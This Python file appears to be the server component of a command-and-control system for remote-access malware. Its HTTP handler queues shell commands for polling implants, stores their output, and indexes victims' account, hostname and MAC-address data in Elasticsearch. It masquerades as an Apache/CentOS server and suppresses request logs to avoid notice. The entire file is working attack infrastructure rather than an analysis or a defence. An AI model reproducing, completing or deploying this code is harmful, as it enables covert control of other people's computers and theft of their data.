import json
import time
import queue
import threading
import urllib.parse
from pathlib import Path
from urllib.parse import unquote_plus
from http.server import BaseHTTPRequestHandler
from server_settings import (
    ES_HANDLER, CONNECTED_CLIENTS, client_lock,
    command_queue, response_storage, response_lock,
    CMD_REQUEST, RESPONSE, CWD_RESPONSE, CLIENT_CREDENTIALS,
    RESPONSE_KEY, KEEP_ALIVE_CMD)


# Map client IP -> last command ID sent
last_cmd_id_per_ip = {}
last_cmd_lock = threading.Lock()


class MyHandler(BaseHTTPRequestHandler):

    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # creates a directory for each client using elasticsearch ID
    def create_client_dir(self, client_id):
        if not client_id:
            return
        dir_path = Path(__file__).parent / str(client_id)
        dir_path.mkdir(parents=True, exist_ok=True)


    # Handles get request from client
    def do_GET(self):
        try:
            if not self.path.startswith(CMD_REQUEST):
                self.send_response(404)
                self.end_headers()
                return

            client_identifier = self.path.split(CMD_REQUEST)[1]
            client_account, client_hostname = client_identifier.split('@')
            client_id = ES_HANDLER.get_client_id("system-name", client_hostname)

            if not client_id:
                client_id = client_identifier
            with client_lock:
                CONNECTED_CLIENTS[client_id] = {
                    'display': client_identifier,
                    'last_seen': time.time(),
                    'ip': self.client_address[0]
                }

            command_to_send = None
            cmd_id = None
            temp_queue = []
            try:
                while True:
                    item = command_queue.get_nowait()
                    if item[0] == client_id:
                        command_to_send = item[1]
                        cmd_id = item[2]
                        with last_cmd_lock:
                            last_cmd_id_per_ip[self.client_address[0]] = cmd_id
                        break
                    else:
                        temp_queue.append(item)
            except queue.Empty:
                pass
            for item in temp_queue:
                command_queue.put(item)

            if command_to_send is None:
                command_to_send = KEEP_ALIVE_CMD

            self.send_response(200)
            self.end_headers()
            self.wfile.write(command_to_send.encode())

        except Exception as e:
            print(f"[-] Error in do_GET: {e}")
            self.send_response(500)
            self.end_headers()


    # Handles post requests from client
    def do_POST(self):
        try:
            if self.path == RESPONSE or self.path == CWD_RESPONSE:
                data = self._handle_post_data()
                if not data.strip():
                    self.send_response(200)
                    self.end_headers()
                    return

                # Try to parse as key=value pairs (new client format)
                parsed = urllib.parse.parse_qs(data)
                cmd_id = parsed.get('command_id', [None])[0]
                cmd_output = parsed.get('output', [''])[0]

                if cmd_id is not None:
                    # New format: we have explicit command ID
                    if cmd_output.strip():
                        with response_lock:
                            response_storage[int(cmd_id)] = cmd_output
                else:
                    # Old format: data is the raw output, use last command ID for this IP
                    with last_cmd_lock:
                        last_id = last_cmd_id_per_ip.get(self.client_address[0])
                    if last_id is not None and data.strip():
                        with response_lock:
                            response_storage[last_id] = data
                    elif data.strip():
                        print(f"[+] Output from {self.client_address[0]}:")
                        print(data)

                self.send_response(200)
                self.end_headers()

            elif self.path == CLIENT_CREDENTIALS:
                data = self._handle_post_data()
                client_info = json.loads(data)
                username = client_info.get("user")
                if username and ES_HANDLER.is_client_present(username):
                    client_id = ES_HANDLER.get_client_id("mac-address", client_info.get("mac-address"))
                    if client_id:
                        ES_HANDLER.update_document(client_id, client_info)
                        print(f"[+] Updated client info for {username}")
                else:
                    new_client_id = ES_HANDLER.index_client_data(client_info)
                    if new_client_id:
                        self.create_client_dir(new_client_id)
                    print(f"[+] Indexed new client info for {username}")
                self.send_response(200)
                self.end_headers()

            else:
                self.send_response(404)
                self.end_headers()
                print(f"[-] Unknown POST path: {self.path} from {self.client_address[0]}")

        except Exception as e:
            print(f"[-] Error in do_POST: {e}")
            self.send_response(500)
            self.end_headers()


    def _handle_post_data(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            return ""
        data = self.rfile.read(content_length).decode()
        if data.startswith(f"{RESPONSE_KEY}="):
            data = data.replace(f"{RESPONSE_KEY}=", "", 1)
        return unquote_plus(data)


    def log_request(self, code="-", size="-"):
        pass
